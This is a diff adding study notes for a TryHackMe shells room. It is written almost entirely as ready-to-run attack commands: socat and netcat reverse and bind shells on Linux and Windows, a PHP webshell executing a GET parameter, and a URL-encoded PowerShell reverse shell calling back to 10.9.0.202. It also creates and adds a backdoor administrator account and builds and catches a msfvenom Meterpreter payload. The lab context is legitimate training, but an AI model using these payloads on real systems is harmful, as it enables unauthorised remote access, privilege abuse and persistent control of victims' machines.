@@ -1,0 +1,114 @@
+#Task 13 Practice and Examples 
+- Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
+SOCAT REVERSE SHELL
+run below  command on attacker’s terminal to start a socat listener 
+socat TCP-L:4444 -  
+
+run below command on target’s terminal to connect back to socat listener 
+socat TCP:<tun0-ip>:4444 EXEC:"bash -li"  
+
+
+SOCAT BIND SHELL
+run below command on target’s terminal
+ socat TCP-L:4445 EXEC:"bash -li"
+
+run below command on attacker’s terminal
+ socat TCP:<ip>:4445 - 
+ 
+SOCAT SPECIAL TECHNIQUES
+run below command on attacker’s terminal
+socat TCP-L:4446 FILE:`tty`,raw,echo=0  
+
+run below command on target’s terminal
+socat TCP:<tun0-ip>:4446 EXEC:"bash -li",pty,stderr,sigint,setsid,sane  
+
+
+
+- Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?
+No
+
+- Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+Create a new file and call it shell.php and add the following to that file
+ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
+Now run the following code in the browser. Do not forget to change the IP. First one change it tot he machines IP as there is where the php file is and the second one is your machine
+
+http://10.10.73.210/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.9.0.202%27%2C1337)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22%0A
+
+
+
+- The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
+hint:
+net users
+net user admin2 password /ad
+net localgroup administrators admin2 /add
+
+
+- Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
+NETCAT REVERSE SHELL
+ start a netcat listener in a terminal
+nc -lvnp 4445
+
+login to windows machine using RDP.And run the below command in cmd
+  nc <tun0-ip> 4445 -e "cmd.exe"
+  nc 10.9.0.202 4445 -e "cmd.exe"
+
+
+NETCAT BIND SHELL 
+ start a netcat listener on cmd
+nc -lvnp 3333 -e "cmd.exe" 
+
+run below command on attacker’s terminal
+ nc <target-ip>  3333
+ nc 10.10.73.210 3333
+ 
+SOCAT REVERSE SHELL
+ run below command on attacker’s terminal
+socat TCP-L:8888 -
+
+run below command on target’s cmd
+ socat TCP:<tun0-ip>:8888 EXEC:powershell.exe,pipes
+ socat TCP:10.9.0.202:8888 EXEC:powershell.exe,pipes
+
+SOCAT BIND SHELL
+run below command on cmd to start a socat listener
+      socat TCP-L:4444 EXEC:powershell.exe,pipes
+
+run below command on attacker’s terminal
+     socat TCP:<target-ip>:4444 - 
+     socat TCP:10.10.73.210:4444 -
+     
+
+
+- Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
+on kali machine:
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<tun0-ip> LPORT=4444
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.9.0.202 LPORT=4444
+..shell.exe
+copy shell.exe to windows target
+turn on other tab
+run msfconsole
+msfconsole
+use multi/handler
+set LHOST=<tun0-ip>
+(set LHOST 10.9.0.202)
+set LPORT=4444
+set payload windows/x64/meterpreter/reverse_tcp
+run
+...
+run file shell.exe
+
+meterpreter>getuid
+Server username: WIN-SHELLS\Administrator
+...DONE
+
+
+- Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
+NO
+
+
+https://tryhackme.com/room/introtoshells
+https://www.thedutchhacker.com/what-the-shell-on-tryhackme/
+https://pentestinfo.blogspot.com/2021/01/tryhackme-what-shell-writeup.html
+
+
